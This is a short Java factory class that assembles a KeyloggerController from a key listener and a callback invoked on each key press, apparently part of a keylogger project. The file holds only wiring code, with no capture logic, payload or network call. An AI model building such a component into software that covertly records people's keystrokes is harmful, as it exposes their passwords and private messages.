package infra.composers;

import java.util.function.Consumer;
import adapters.keyloggerController.KeyloggerController;
import infra.keylistenner.Keylistenner;

public class KeyloggerControllerFactory {
    static public KeyloggerController create(Consumer<String> onKeyPressed) {
        return new KeyloggerController(
            new Keylistenner(),
            onKeyPressed
        );
    }
}
